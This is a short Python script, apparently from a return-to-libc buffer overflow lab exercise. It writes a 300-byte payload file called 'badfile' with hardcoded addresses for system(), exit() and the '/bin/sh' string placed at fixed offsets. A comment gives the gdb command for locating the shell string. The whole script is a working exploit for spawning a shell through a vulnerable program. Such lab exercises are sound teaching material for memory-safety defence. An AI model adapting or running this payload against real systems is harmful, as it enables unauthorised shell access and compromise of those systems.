#!/usr/bin/python3 

# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
import sys 

# Fill content with non-zero values 
content = bytearray(0xaa for i in range(300)) 
sh_addr = 0xffffccb9   # address of /bin/sh


content[120:124] = (sh_addr).to_bytes(4, byteorder='little') 

exit_addr = 0xf7db1460 # The address of exit () 

content[116:120] = (exit_addr).to_bytes(4, byteorder='little' ) 

system_addr = 0xf7dbf170 # The address of system() 

content[112:116] = (system_addr).to_bytes(4, byteorder='little' ) 

# Save content to a file 
with open("badfile", "wb") as f: 
    f.write(content) 